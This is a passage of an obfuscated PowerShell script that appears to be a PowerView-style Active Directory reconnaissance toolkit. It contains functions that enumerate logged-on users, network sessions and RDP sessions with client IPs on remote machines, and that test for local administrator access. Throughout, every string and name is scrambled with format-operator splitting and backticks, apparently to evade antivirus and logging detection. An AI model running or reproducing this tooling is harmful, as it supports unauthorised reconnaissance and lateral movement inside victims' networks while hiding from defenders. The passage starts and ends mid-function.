                (5)           {&("{2}{1}{0}" -f ("{2}{0}{1}" -f'-De','bug','e'),'t','Wri') ("{2}{3}{11}{5}{4}{10}{0}{9}{6}{7}{1}{8}" -f("{0}{1}"-f'r','equ'),'m',("{1}{0}" -f'e use','Th'),("{0}{1}" -f 'r ','do'),("{1}{0}"-f ' ','access'),' ','s',("{0}{1}{2}"-f'te','d ','infor'),("{0}{1}" -f 'ati','on.'),'e',("{1}{0}"-f 'o the ','t'),("{1}{3}{2}{0}" -f 'ave','es n','t h','o'))}
                (124)         {&("{2}{1}{0}{3}"-f'-D','ite','Wr',("{0}{1}" -f 'ebu','g')) ("{10}{11}{7}{6}{3}{8}{1}{5}{9}{12}{14}{4}{0}{13}{2}" -f("{1}{0}"-f 't v','o'),'f',("{1}{0}" -f'id.','l'),("{1}{0}"-f'ie','if'),'s n','or ','c',("{0}{1}" -f'ue s','pe'),'d ',("{4}{1}{2}{3}{0}" -f'ara','h','e le','vel p','t'),'T',("{0}{1}"-f 'he ','val'),("{0}{1}"-f 'm','eter'),'a',' i')}
                (87)          {&("{2}{0}{1}{3}"-f'i',("{1}{0}{2}"-f'-Deb','te','u'),'Wr','g') ("{3}{6}{1}{2}{5}{4}{0}" -f '.',("{2}{0}{1}{3}" -f ' p','aram','cified','eter is'),("{2}{0}{1}"-f'not ','va',' '),'The','d','li',("{1}{0}"-f'spe',' '))}
                (234)         {&("{2}{1}{3}{0}" -f ("{0}{1}"-f 'e','bug'),("{1}{0}" -f 'te','ri'),'W','-D') ("{13}{8}{10}{5}{2}{1}{4}{14}{9}{7}{15}{0}{12}{11}{3}{6}"-f 'to ','o',("{2}{1}{0}"-f 'ge en','ar','l'),("{1}{2}{0}{3}" -f'e all','ce','iv',' e'),("{1}{0}" -f ' b','ugh'),("{0}{1}" -f 'y',' a '),("{1}{0}{2}"-f 'ies','ntr','.'),'fer',("{1}{3}{4}{7}{6}{5}{2}{0}"-f'i','rie','c','s are',' avail','e','p','able. S'),'f','f','e','r',("{1}{2}{0}" -f' ent','Mor','e'),'u',' ')}
                (8)           {&("{0}{1}{2}"-f'Wr',("{2}{1}{0}" -f'e','te-D','i'),'bug') ("{10}{4}{5}{1}{7}{6}{8}{2}{3}{9}{0}"-f'e.','n',("{1}{0}"-f 'a','ail'),'b','i','e','m',("{0}{1}" -f 't',' me'),("{2}{1}{0}"-f 'av','s ','ory i'),'l',("{1}{0}{2}"-f 'suff','In','ic'))}
                (2312)        {&("{0}{1}{2}"-f 'Wr','ite',("{2}{1}{0}"-f 'bug','e','-D')) ("{0}{7}{9}{2}{8}{6}{1}{3}{10}{5}{4}"-f 'A ',("{2}{0}{1}"-f't wit','h th',' exis'),'n ',("{1}{0}" -f' co','e'),'me.',("{1}{0}"-f'r na','e'),("{1}{0}" -f'ot','s n'),("{1}{0}"-f'ss','se'),'doe','io',("{1}{0}"-f'ut','mp'))}
                (2351)        {&("{0}{2}{1}" -f("{1}{0}" -f 'rite','W'),'g',("{1}{0}" -f'bu','-De')) ("{1}{4}{3}{6}{9}{5}{8}{0}{7}{2}"-f 't v',("{1}{0}{2}" -f' c','The','omp'),'d.','m',("{1}{0}"-f'r na','ute'),'is ','e','ali','no',' ')}
                (2221)        {&("{1}{2}{0}{3}"-f ("{1}{0}"-f '-Debu','e'),'Wri','t','g') ("{3}{0}{2}{1}{4}{5}" -f ("{1}{0}" -f'e ','rnam'),("{0}{1}"-f 't fo','u'),'no','Use','n','d.')}
                (53)          {&("{2}{0}{1}"-f ("{0}{2}{1}"-f 'r','b','ite-De'),'ug','W') ("{3}{6}{4}{2}{0}{5}{1}" -f't',("{1}{0}" -f'found',' '),("{1}{0}"-f 'no','d '),("{1}{0}"-f 'tn','Hos'),("{1}{0}" -f' coul','e'),' be','am')}
            }
        }
    }
}


function g`eT-NetL`oGGED`ON {


    [CmdletBinding()]
    param(
        [Parameter(vAluEFroMpiPELInE=${tR`Ue})]
        [Alias({"{1}{0}"-f("{0}{1}"-f 'N','ame'),{"{1}{0}"-f 'st','Ho'}})]
        [String]
        ${cO`mPUTe`R`NAmE} = ("{1}{3}{2}{0}" -f 't','loc','os','alh')
    )

    begin {
        if (${P`SB`o`U`NdpARaMetErS}[("{1}{0}" -f 'g',("{1}{0}"-f 'u','Deb'))]) {
            ${D`EBuG`PRE`FerE`Nce} = ("{0}{2}{1}" -f'Co','e',("{0}{1}"-f'nt','inu'))
        }
    }

    process {

        
        ${COmp`UtE`RnAme} = &("{2}{0}{1}" -f("{1}{0}"-f 'me','Na'),("{0}{1}" -f 'Fie','ld'),("{1}{0}" -f'et-','G')) -Object ${C`oMPUTEr`NA`mE}

        
        ${QUEr`YLEV`El} = 1
        ${P`TrInFO} =  (&("{0}{1}{2}"-f("{1}{0}" -f 'A','vArI'),'b','Le')  ("S"+"qg")  )."V`ALUE"::"Z`eRO"
        ${ent`RiEsr`Ead} = 0
        ${To`TAl`REaD} = 0
        ${R`ES`UmE`hANdlE} = 0

        
        ${reSU`lT} = ${NeTAP`I`32}::"nE`TW`kstAuseReNuM"."in`Vo`Ke"(${COM`PU`TERN`Ame}, ${Qu`e`RY`leVEl}, [ref]${P`T`RInfO}, -1, [ref]${En`TRI`ESrE`Ad}, [ref]${tOTaL`R`EAD}, [ref]${r`e`s`UMeHandle})

        
        ${ofFS`et} = ${pt`RI`NFO}.("{0}{1}" -f("{0}{1}" -f'ToI','nt'),'64')."I`NvoKE"()

        &("{3}{0}{2}{1}" -f'i','g',("{0}{1}"-f 'te-Deb','u'),'Wr') ('G'+("{2}{1}{0}"-f'gge','NetLo','et-')+'d'+'on '+'r'+("{1}{0}"-f 'sult','e')+': '+"$Result")

        
        if ((${REsu`LT} -eq 0) -and (${OFF`set} -gt 0)) {

            
            ${I`Nc`Rem`enT} = ${WK`St`A_uS`Er_I`NFO_1}::("{0}{2}{1}"-f'G',("{0}{1}" -f 'tS','ize'),'e')."I`NvOKE"()

            
            for (${I} = 0; (${i} -lt ${entRIes`R`e`Ad}); ${I}++) {
                
                
                ${n`e`W`intPtR} = &("{0}{1}{2}" -f'New','-',("{0}{1}{2}"-f'O','bj','ect')) ("{0}{2}{1}"-f("{0}{1}"-f'Syste','m'),("{0}{1}"-f'n','tptr'),'.I') -ArgumentList ${O`FFsEt}
                ${IN`Fo} = ${n`E`w`inTPtR} -as ${WKs`T`A_U`SER_`InFO_1}

                
                ${i`NFO} | &("{4}{0}{1}{2}{3}" -f ("{1}{0}"-f'ect','l'),'-','O',("{1}{0}" -f 'ject','b'),'Se') ('*')
                ${O`F`FsEt} = ${NeWIn`Tp`TR}.("{1}{0}{2}" -f 'In','To','t64')."iNV`oKe"()
                ${oFF`s`ET} += ${i`N`cR`eMeNT}

            }

            
            ${N`ULL} = ${N`E`T`ApI32}::("{2}{0}{1}{3}"-f 'u','ff',("{0}{2}{1}"-f 'Ne','piB','tA'),("{0}{1}" -f'erFr','ee'))."In`VoKE"(${PTR`I`NFO})
        }
        else
        {
            switch (${reS`U`LT}) {
                (5)           {&("{0}{1}{2}{3}"-f 'Wri',("{1}{0}"-f'e','te-D'),'bu','g') ("{0}{6}{11}{2}{10}{7}{13}{14}{4}{3}{15}{1}{5}{12}{9}{8}" -f("{0}{1}" -f 'The ','us'),'d',("{2}{1}{0}"-f 'hav','t ',' no'),'es','u',' i',("{1}{0}" -f'do','er '),("{0}{1}{2}" -f 'ce','ss',' to'),'.',("{2}{1}{0}"-f 'ion','t','ma'),("{0}{1}"-f 'e',' ac'),'es',("{0}{1}"-f 'nf','or'),("{2}{0}{1}"-f' ','r',' the'),'eq','te')}
                (124)         {&("{1}{0}{2}{3}" -f 'te','Wri',("{0}{1}" -f '-De','b'),'ug') ("{1}{5}{8}{0}{3}{2}{15}{10}{11}{14}{9}{6}{4}{7}{13}{12}" -f'e ','Th',("{2}{3}{1}{0}"-f'e ','for th','pecified',' '),'s','ot ',("{0}{1}"-f 'e v','a'),("{0}{1}"-f 'ter is',' n'),'va','lu',("{0}{1}"-f 'ar','ame'),'e',("{0}{1}" -f've','l '),'id.','l','p','l')}
                (87)          {&("{1}{0}{2}" -f ("{1}{0}"-f 'De','ite-'),'Wr','bug') ("{1}{6}{9}{7}{5}{3}{2}{4}{8}{0}" -f '.',("{0}{1}" -f'The',' '),'r ',("{1}{0}" -f 'mete','a'),'is ','ar',("{0}{1}" -f 's','pec'),' p',("{0}{1}{2}" -f 'not ','va','lid'),("{1}{0}" -f 'ied','if'))}
                (234)         {&("{1}{3}{0}{2}"-f 'bu',("{1}{0}"-f'it','Wr'),'g',("{0}{1}"-f'e-','De')) ("{2}{8}{3}{6}{1}{11}{13}{0}{7}{10}{12}{4}{5}{9}"-f("{1}{0}" -f 'u','eno'),("{1}{4}{0}{2}{3}" -f 'c','le. ','ify a',' ','Spe'),("{1}{2}{0}"-f're entrie','M','o'),'av',("{1}{0}{2}" -f 'll',' a',' e'),("{0}{1}"-f 'ntr','ie'),("{1}{0}"-f 'lab','ai'),'gh ',("{1}{0}" -f 'are ','s '),'s.',("{0}{2}{1}"-f 'b','rece','uffer to '),'lar','ive','ge ')}
                (8)           {&("{2}{3}{0}{1}" -f'u','g','Wr',("{1}{0}"-f'te-Deb','i')) ("{2}{1}{3}{0}{4}{5}" -f("{2}{1}{0}" -f 'or','em','nt m'),'n','I',("{2}{0}{1}"-f 'uffi','cie','s'),("{1}{0}{2}"-f 'is','y ',' a'),("{0}{2}{1}"-f'v','e.','ailabl'))}
                (2312)        {&("{2}{1}{3}{0}"-f("{1}{0}"-f'g','ebu'),("{0}{1}" -f 'ite','-'),'Wr','D') ("{4}{1}{6}{0}{5}{7}{2}{8}{3}"-f 'h ',("{1}{4}{2}{0}{3}" -f 'st w','s n','exi','i','ot '),("{0}{1}"-f 'om','pute'),'e.',("{1}{2}{0}"-f'ion doe','A ses','s'),'the','t',' c',("{0}{1}" -f 'r ','nam'))}
                (2351)        {&("{1}{0}{2}" -f 'it','Wr',("{0}{1}"-f'e-De','bug')) ("{2}{4}{5}{1}{0}{3}{7}{6}" -f ("{0}{2}{1}"-f ' ','ot ','is n'),'ame','The','va',("{1}{0}"-f 'e',' comput'),'r n','id.','l')}
                (2221)        {&("{2}{0}{1}"-f 'i',("{2}{0}{1}" -f 'bu','g','te-De'),'Wr') ("{4}{3}{0}{2}{5}{1}" -f 'me',("{0}{1}" -f 'un','d.'),("{1}{0}" -f 'not',' '),'rna','Use',' fo')}
                (53)          {&("{2}{1}{0}"-f ("{0}{1}" -f'-D','ebug'),("{1}{0}" -f 'e','rit'),'W') ("{1}{0}{2}{4}{3}" -f ("{0}{1}"-f'tn','am'),'Hos',("{2}{0}{1}"-f 'co','ul','e '),("{1}{0}"-f ' found','e'),("{1}{0}{2}" -f ' not ','d','b'))}
            }
        }
    }
}


function Ge`T`-`Net`sESSIoN {


    [CmdletBinding()]
    param(
        [Parameter(VALUeFRompipELINe=${TR`Ue})]
        [Alias({"{1}{2}{0}"-f'e',{"{0}{1}"-f'Ho','stN'},'am'})]
        [String]
        ${com`P`U`Ter`NamE} = ("{3}{2}{1}{0}" -f 't','s','o',("{1}{0}"-f 'alh','loc')),

        [String]
        ${us`E`RnAme} = ''
    )

    begin {
        if (${pSBo`U`NdpARAMeTE`Rs}[("{1}{0}"-f'g',("{1}{0}" -f 'ebu','D'))]) {
            ${d`Eb`UgprEFEre`N`cE} = ("{2}{1}{0}" -f 'e',("{0}{1}" -f'on','tinu'),'C')
        }
    }

    process {

        
        ${Co`mpute`Rn`AmE} = &("{1}{2}{0}{3}{4}"-f 'm','G',("{0}{1}"-f'et','-Na'),'e',("{0}{1}"-f 'Fi','eld')) -Object ${CoM`PUt`ern`AmE}

        
        ${qU`E`RYlevEl} = 10
        ${pTri`NfO} =   ${S`QG}::"zE`RO"
        ${EN`TRieS`R`ead} = 0
        ${ToT`Alre`AD} = 0
        ${r`e`suM`EhAndLE} = 0

        
        ${r`ESUlT} = ${n`eTAP`i32}::"N`et`seSS`ioNEN`UM"."I`NvOkE"(${ComPUT`e`R`NAMe}, '', ${uS`erN`AmE}, ${qUeRY`LE`VEL}, [ref]${p`TriN`FO}, -1, [ref]${e`N`Tri`esreAd}, [ref]${t`o`TalrE`Ad}, [ref]${ReSUMe`Ha`N`dlE})

        
        ${of`Fs`Et} = ${pT`R`INfo}.("{0}{1}"-f("{0}{1}"-f'To','Int6'),'4')."iN`VOkE"()

        &("{0}{1}{2}"-f("{1}{0}" -f't','Wri'),("{1}{0}"-f'De','e-'),'bug') (("{0}{1}"-f 'G','et-N')+'etS'+("{0}{1}" -f'essi','o')+'n'+' '+'r'+("{0}{1}"-f 'e','sul')+'t: '+"$Result")

        
        if ((${R`Es`UlT} -eq 0) -and (${oF`F`SeT} -gt 0)) {

            
            ${iNC`Re`mE`NT} = ${SEssi`O`N_InfO`_10}::("{1}{0}"-f'ize',("{1}{0}"-f 'S','Get'))."InV`OKe"()

            
            for (${I} = 0; (${I} -lt ${e`NtRi`e`Sread}); ${i}++) {
                
                
                ${n`EwinTP`Tr} = &("{0}{2}{1}"-f ("{1}{0}" -f '-','New'),'ect','Obj') ("{0}{2}{1}{3}"-f'S',("{1}{0}"-f't','.In'),("{0}{1}"-f 'yste','m'),'ptr') -ArgumentList ${ofF`SeT}
                ${i`NFo} = ${nEw`INt`p`TR} -as ${sESsi`On_infO`_`10}

                
                ${I`NfO} | &("{2}{0}{1}"-f("{0}{1}{2}" -f 'e','ct-','Obj'),'ect','Sel') ('*')
                ${O`Ffs`et} = ${nEW`in`TpTr}.("{0}{2}{1}" -f 'T','t64','oIn')."I`NvO`ke"()
                ${o`F`FsEt} += ${inC`R`eMEnt}

            }
            
            ${N`ULL} = ${nE`TapI`32}::("{4}{1}{2}{0}{3}" -f("{1}{0}"-f'F','fer'),'e',("{1}{0}{2}"-f'u','tApiB','f'),'ree','N')."INv`okE"(${p`TRIN`FO})
        }
        else
        {
            switch (${R`e`sUlt}) {
                (5)           {&("{1}{2}{0}" -f 'ug','Wr',("{2}{0}{1}" -f 't','e-Deb','i')) ("{14}{7}{3}{6}{2}{8}{11}{13}{9}{10}{5}{0}{4}{1}{12}"-f ("{1}{0}"-f 'eq','he r'),("{2}{3}{4}{0}{1}" -f'n','format','s','t','ed i'),("{0}{1}"-f'r ','doe'),'s','ue','o t','e','u','s ',' ac',("{0}{1}" -f'ces','s t'),("{1}{0}{2}"-f't ha','no','v'),("{0}{1}"-f'io','n.'),'e',("{0}{1}" -f'Th','e '))}
                (124)         {&("{2}{1}{3}{0}"-f'g',("{0}{1}"-f '-De','b'),("{0}{1}" -f 'Wr','ite'),'u') ("{9}{13}{14}{8}{16}{1}{6}{10}{3}{7}{12}{0}{5}{11}{2}{4}{15}" -f'ter','or',("{0}{2}{1}" -f ' ','ali','not v'),("{1}{0}"-f'a','par'),'d',' i',("{1}{0}" -f 'the ',' '),'m','ci','The',("{0}{2}{1}" -f 'l','vel ','e'),'s','e',("{0}{1}"-f' v','alue'),("{1}{0}"-f 'pe',' s'),'.',("{1}{0}{2}"-f 'i','f','ed f'))}
                (87)          {&("{2}{1}{0}"-f("{1}{0}" -f 'bug','e'),("{0}{1}"-f'it','e-D'),'Wr') ("{2}{6}{10}{9}{4}{8}{7}{0}{1}{5}{3}" -f' n',("{0}{1}" -f 'ot ','v'),("{2}{1}{0}"-f'i','ec','The sp'),'id.','t','al','fi',("{1}{0}"-f ' is','r'),'e',("{1}{2}{0}"-f 'ame','d pa','r'),'e')}
                (234)         {&("{3}{2}{0}{1}"-f'ebu','g',("{0}{1}"-f'rite-','D'),'W') ("{20}{19}{4}{15}{18}{8}{0}{5}{11}{9}{7}{6}{12}{3}{14}{17}{2}{16}{1}{10}{13}" -f("{1}{0}" -f 'lar','a '),("{1}{0}" -f'll',' a'),'eiv',' r',("{0}{1}" -f' ava','i'),("{2}{0}{1}" -f 'e',' eno','g'),' t','er',("{2}{1}{3}{0}"-f'fy ','c',' Spe','i'),("{0}{1}"-f 'h',' buff'),' ','ug','o',("{0}{1}"-f'en','tries.'),'e',("{1}{0}" -f'ble','la'),'e','c','.',("{1}{0}"-f 'are',' '),("{3}{0}{1}{2}"-f 're entri','e','s','Mo'))}
                (8)           {&("{0}{2}{1}" -f ("{1}{0}"-f 'ite','Wr'),'g',("{0}{1}"-f '-Deb','u')) ("{6}{2}{3}{1}{5}{4}{0}" -f("{0}{1}" -f 'lab','le.'),("{1}{0}{2}" -f' memory ','nt','i'),'ffi','cie','ai',("{1}{0}" -f 'v','s a'),("{0}{1}" -f 'Ins','u'))}
                (2312)        {&("{3}{1}{2}{0}"-f 'bug','ite','-De','Wr') ("{4}{11}{6}{3}{0}{7}{2}{8}{5}{1}{10}{9}" -f ("{0}{1}"-f 'ot ','e'),'m','t ','n','A s',("{0}{1}" -f 'h','e co'),("{1}{0}"-f' ','oes'),'xis',("{1}{0}"-f'th t','wi'),("{1}{0}"-f 'ame.','n'),("{1}{0}"-f' ','puter'),("{1}{0}{2}" -f'ion ','ess','d'))}
                (2351)        {&("{1}{2}{0}" -f ("{0}{1}"-f 'e-De','bug'),'Wr','it') ("{8}{6}{4}{2}{7}{5}{1}{0}{3}"-f ("{1}{0}{2}" -f'va','ot ','li'),("{0}{1}" -f' is',' n'),("{2}{0}{1}"-f 'puter ','n','m'),'d.',' co','e','e','am','Th')}
                (2221)        {&("{0}{2}{1}"-f'W',("{0}{1}{2}" -f'te-De','bu','g'),'ri') ("{3}{1}{0}{2}"-f 'd',("{2}{1}{0}" -f'n','u','me not fo'),'.',("{0}{1}"-f 'U','serna'))}
                (53)          {&("{0}{1}{3}{2}"-f 'Wr','i',("{1}{0}" -f 'g','Debu'),'te-') ("{1}{7}{4}{0}{3}{2}{6}{5}" -f ' c',("{1}{0}" -f't','Hos'),'no',("{1}{0}"-f' ','ould'),'e',("{2}{1}{0}" -f 'und','o',' f'),("{1}{0}"-f 'be','t '),'nam')}
            }
        }
    }
}


function GeT`-netrdp`seS`sIOn {


    [CmdletBinding()]
    param(
        [Parameter(vAlUEfROmPiPELINe=${T`Rue})]
        [Alias({"{1}{0}"-f'me',{"{1}{0}" -f 'tNa','Hos'}})]
        [String]
        ${co`Mpu`Te`RnAmE} = ("{2}{1}{3}{0}"-f't','h',("{0}{1}" -f 'l','ocal'),'os')
    )
    
    begin {
        if (${psbouNdPar`A`M`Et`eRs}[("{0}{1}" -f ("{0}{1}"-f 'De','bu'),'g')]) {
            ${d`EBug`prEf`eRen`cE} = ("{0}{2}{1}"-f("{0}{1}"-f'C','ont'),'e','inu')
        }
    }

    process {

        
        ${comPUT`eRN`AMe} = &("{1}{2}{0}" -f'eld',("{1}{0}" -f'ameF','Get-N'),'i') -Object ${cOMpu`TE`RNaME}

        
        ${h`AndlE} = ${WTS`APi`32}::("{0}{1}{2}{3}" -f 'WTS','Op',("{0}{1}"-f'e','nSe'),("{1}{0}"-f 'rEx','rve'))."inVo`Ke"(${CO`M`PutERNa`Me})

        
        if (${HAnD`Le} -ne 0) {

            &("{2}{1}{3}{0}" -f'bug','rit','W',("{1}{0}" -f'De','e-')) ('W'+'TSO'+'pe'+("{1}{3}{0}{2}"-f 'erEx','nSe',' ','rv')+("{0}{1}"-f 'ha','ndle')+':'+' '+"$Handle")

            
            ${pPsESsIO`NIn`FO} =  ${s`qG}::"ZE`Ro"
            ${pco`U`NT} = 0
            
            
            ${RES`ULt} = ${w`Ts`API32}::"Wts`EN`UmE`Ra`TE`sESs`iOnsex"."i`N`VoKe"(${HA`NDlE}, [ref]1, 0, [ref]${pPs`EsSI`oni`N`FO}, [ref]${PC`Ount})

            
            ${O`F`FseT} = ${ppSesS`i`oN`i`NfO}.("{1}{0}"-f '4',("{0}{1}" -f 'ToInt','6'))."in`VOkE"()

            &("{0}{3}{1}{2}"-f 'Wri','Deb','ug','te-') (("{1}{0}" -f 'E','WTS')+'num'+'era'+("{1}{0}" -f'ss','teSe')+("{0}{1}"-f 'ions','E')+'x '+'r'+("{1}{0}" -f': ','esult')+"$Result")
            &("{1}{2}{0}" -f ("{0}{1}" -f 'te','-Debug'),'W','ri') ('p'+("{1}{0}{2}" -f 'ount','C',':')+' '+"$pCount")

            if ((${ResU`Lt} -ne 0) -and (${OffS`et} -gt 0)) {

                
                ${inCr`E`M`ENt} = ${WTS_s`ess`ION`_`inFO_1}::("{1}{2}{0}" -f 'e',("{1}{0}" -f 'S','Get'),'iz')."INv`O`KE"()

                
                for (${i} = 0; (${i} -lt ${PcO`Unt}); ${i}++) {
     
                    
                    
                    ${n`e`WiNTptr} = &("{2}{1}{0}"-f 'ct',("{0}{1}"-f 'Ob','je'),("{0}{1}" -f'N','ew-')) ("{1}{2}{3}{0}" -f ("{0}{1}"-f 'tpt','r'),("{1}{0}"-f 'st','Sy'),("{0}{1}" -f 'em.','I'),'n') -ArgumentList ${OfFS`eT}
                    ${I`NFO} = ${Ne`win`TP`Tr} -as ${wT`s_sessi`oN_`I`NfO_1}

                    ${R`DpsESs`iON} = &("{0}{2}{1}" -f'New','ect',("{1}{0}"-f'Obj','-')) ("{1}{2}{0}" -f 't',("{0}{1}"-f'PS','Ob'),'jec')

                    if (${iN`Fo}."pH`OsTnA`mE") {
                        ${R`D`pSEss`IOn} | &("{2}{1}{3}{0}" -f 'ber','d','A',("{0}{1}" -f 'd-Me','m')) ("{0}{1}{3}{2}"-f("{1}{2}{0}" -f 'rop','Not','ep'),'er','y','t') ("{0}{1}{2}" -f("{0}{1}" -f 'Comp','ute'),'rNa','me') ${In`Fo}."P`hOSTn`Ame"
                    }
                    else {
                        
                        ${rdPs`e`S`sIoN} | &("{1}{0}{2}"-f 'dd-','A',("{0}{1}"-f 'M','ember')) ("{0}{2}{1}"-f 'No',("{0}{1}"-f 'p','erty'),("{1}{0}"-f 'pro','te')) ("{1}{0}{2}"-f 'a',("{1}{0}{2}" -f 'm','Co','puterN'),'me') ${C`O`MPut`ErnAME}
                    }

                    ${RdpseSS`i`oN} | &("{0}{2}{1}" -f("{1}{0}"-f'-Me','Add'),'er','mb') ("{1}{0}{2}" -f 'r',("{0}{1}" -f 'Not','ep'),("{0}{1}"-f'oper','ty')) ("{1}{0}{2}"-f 'Na',("{0}{1}{2}"-f'Ses','si','on'),'me') ${I`NFO}."pS`ESs`i`oNnamE"

                    if ($(-not ${In`Fo}."pDOma`in`NAMe") -or (${i`Nfo}."pDomAi`N`NaMe" -eq '')) {
                        
                        ${r`DpsES`s`iOn} | &("{2}{0}{1}"-f("{2}{1}{0}"-f 'e','Memb','d-'),'r','Ad') ("{0}{3}{2}{1}"-f("{1}{0}"-f 'ep','Not'),'rty','pe','ro') ("{2}{0}{1}"-f("{1}{0}" -f 'Nam','er'),'e','Us') "$($Info.pUserName)"
                    }
                    else {
                        ${R`D`PsESSIoN} | &("{0}{1}{2}"-f'A',("{2}{0}{1}"-f '-Me','mbe','dd'),'r') ("{2}{1}{0}" -f ("{1}{0}" -f 'y','pert'),("{1}{0}"-f'ro','ep'),'Not') ("{0}{1}{2}"-f'Us',("{0}{1}"-f 'erN','a'),'me') "$($Info.pDomainName)\$($Info.pUserName)"
                    }

                    ${rD`pSeSsi`On} | &("{1}{0}{2}" -f '-M','Add',("{0}{1}" -f'emb','er')) ("{3}{0}{1}{2}"-f ("{1}{0}" -f 'er','op'),'t','y',("{0}{1}"-f'No','tepr')) 'ID' ${I`NfO}."Se`s`SIoniD"
                    ${rd`psE`ssioN} | &("{0}{1}{3}{2}"-f 'Ad',("{0}{1}" -f'd','-Me'),'r','mbe') ("{2}{1}{0}"-f 'ty','r',("{2}{0}{1}" -f 'te','prope','No')) ("{0}{1}"-f'Sta','te') ${iN`FO}."s`TaTE"

                    ${p`p`BUFF`eR} =  (&('lS') ("{1}{3}{0}{2}"-f 'e:s','vaRi','Qg','ABl'))."V`AlUE"::"z`ERO"
                    ${p`BYtEs`R`EtURNED} = 0

                    
                    
                    ${ReS`U`lT2} = ${WT`S`API`32}::"wtsQ`Ue`RYS`ES`s`iO`NIn`FOrmAtIOn"."I`NV`oke"(${Ha`N`DlE}, ${I`NfO}."s`ES`Sio`NID", 14, [ref]${P`PBUFf`er}, [ref]${pB`YTEs`RE`Tu`RneD})

                    ${Of`Fset2} = ${pp`BUFfeR}.("{0}{1}" -f 'To',("{0}{1}" -f 'Int6','4'))."I`NVoKE"()
                    ${nEwiN`TP`TR2} = &("{0}{2}{1}"-f 'New','ct',("{0}{1}" -f '-','Obje')) ("{2}{0}{3}{1}"-f'em.','r',("{0}{1}" -f'Sys','t'),("{1}{0}" -f 'pt','Int')) -ArgumentList ${OF`F`sEt2}
                    ${i`NfO2} = ${nE`wiNt`Pt`R2} -as ${w`TS_c`lI`enT_aDDrEsS}

                    ${SO`UrCE`ip} = ${iN`Fo2}."ADd`RESs"       
                    if(${s`OUr`ceIP}[2] -ne 0) {
                        ${SoU`RcE`iP} = [String]${sou`RC`eIP}[2]+"."+[String]${sou`R`ceip}[3]+"."+[String]${S`oUr`CEIp}[4]+"."+[String]${S`o`URCE`ip}[5]
                    }
                    else {
                        ${s`O`Urceip} = ${N`UlL}
                    }

                    ${Rd`Ps`esSION} | &("{0}{1}{2}" -f("{0}{1}"-f'Add','-M'),'e',("{1}{0}" -f 'er','mb')) ("{1}{2}{0}" -f("{0}{1}"-f'er','ty'),'N',("{0}{1}" -f 'ote','prop')) ("{0}{1}" -f("{0}{1}" -f'So','ur'),("{0}{1}"-f'ceI','P')) ${s`OuRc`EiP}
                    ${Rdpses`s`Ion}

                    
                    ${Nu`LL} = ${w`TSapI`32}::("{0}{1}{2}"-f 'W','TSF',("{1}{2}{0}" -f 'ory','reeM','em'))."INVo`ke"(${P`p`BuF`Fer})

                    ${OF`F`seT} += ${IN`C`RE`mENt}
                }
                
                ${nu`Ll} = ${wts`A`Pi`32}::("{1}{0}{2}{3}"-f 'r',("{0}{1}"-f 'WT','SF'),("{1}{0}"-f'em','eeM'),("{1}{0}"-f'x','oryE'))."In`VOke"(2, ${pPsE`S`s`Io`NINfO}, ${pCO`U`NT})
            }
            
            ${n`Ull} = ${W`TSA`p`i32}::("{0}{3}{2}{1}" -f'WTS',("{0}{1}{2}" -f 'se','Serv','er'),'o','Cl')."inVo`ke"(${haN`dLe})
        }
        else {
            
            
            ${e`Rr} = ${K`ErNEL32}::("{2}{3}{1}{0}"-f'or','r',("{1}{0}" -f 'astE','GetL'),'r')."i`NV`OKe"()
            &("{1}{2}{0}"-f'se',("{1}{0}{2}" -f'ite-V','Wr','erb'),'u') (("{0}{1}" -f 'Last','Err')+'or:'+' '+"$Err")
        }
    }
}


function INVoK`e`-cHE`ckLo`CA`L`ADm`i`Na`CCeSS {


    [CmdletBinding()]
    param(
        [Parameter(vaLUefroMpIpELINe=${T`RUe})]
        [String]
        [Alias({"{0}{1}" -f("{2}{0}{1}"-f 'stN','am','Ho'),'e'})]
        ${co`MPU`TeRNa`Me} = ("{1}{2}{0}" -f'ost',("{1}{0}"-f'l','loca'),'h')
    )

    begin {
        if (${p`SbO`Un`D`p`ArAmETErs}[("{1}{0}" -f("{0}{1}"-f 'e','bug'),'D')]) {
            ${DEB`UGPRe`Fe`REn`cE} = ("{0}{1}{2}"-f'Co',("{1}{0}" -f'n','nti'),'ue')
        }
    }

    process {

        
        ${CO`MPUTerNA`mE} = &("{2}{3}{0}{1}" -f 'Fie','ld',("{0}{1}" -f 'G','et-N'),'ame') -Object ${C`omP`UT`ErNaMe}

        
        
        ${h`AND`Le} = ${aDvAP`I`32}::("{1}{2}{0}{3}" -f'C',("{0}{1}" -f'O','pen'),'S',("{2}{1}{0}" -f'erW','ag','Man'))."iNvo`KE"("\\$ComputerName", ("{2}{0}{1}{3}" -f("{1}{0}"-f 'cesA','vi'),'ct','Ser','ive'), 0xF003F)

        &("{0}{1}{2}" -f ("{1}{0}" -f'te','Wri'),'-',("{1}{0}"-f'g','Debu')) ('In'+'v'+'ok'+'e'+'-'+("{2}{3}{0}{1}"-f 'o','calAd','Che','ckL')+("{2}{3}{0}{1}"-f 'c','cess ','m','inA')+'h'+'and'+("{0}{1}"-f'le:',' ')+"$Handle")

        
        if (${h`AND`Le} -ne 0) {
            
            ${nu`ll} = ${advA`p`i32}::("{0}{1}{2}{3}"-f ("{1}{0}"-f'seS','Clo'),("{1}{2}{0}"-f'ice','e','rv'),("{0}{1}"-f'Ha','nd'),'le')."i`NVO`ke"(${H`AN`dLE})
            ${t`RuE}
        }
        else {
            
            
            ${E`RR} = ${Kern`E`L`32}::("{0}{1}{2}{3}" -f ("{1}{0}" -f'tL','Ge'),'a','st',("{0}{1}" -f 'Er','ror'))."iNvo`Ke"()
            &("{2}{1}{0}"-f ("{0}{1}"-f'eb','ug'),'e-D',("{1}{0}"-f'rit','W')) ('In'+'v'+("{1}{2}{0}{3}" -f'heck','oke','-C','L')+'o'+("{1}{0}"-f 'Admi','cal')+'nAc'+'ce'+'ss '+'L'+'ast'+("{0}{2}{1}" -f 'Error',' ',':')+"$Err")
            ${fAl`sE}
        }
    }
}


function get-Las`T`l`OGge`d`On {


    [CmdletBinding()]
    param(
        [Parameter(VALuefrompiPeLiNE=${t`RUE})]
        [String]
        [Alias({"{0}{1}"-f("{0}{1}"-f 'Host','N'),'ame'})]        
        ${c`OM`p`UTERNA`me} = "."
    )

    process {

        
        ${C`oMPU`TernaMe} = &("{2}{1}{3}{0}" -f ("{0}{1}"-f 'iel','d'),("{1}{0}"-f 'ame','N'),("{1}{0}"-f'et-','G'),'F') -Object ${CO`MpuTe`RnA`ME}

        
        try {
            ${r`EG} = [WMIClass]"\\$ComputerName\root\default:stdRegProv"
            ${H`klM} = 2147483650
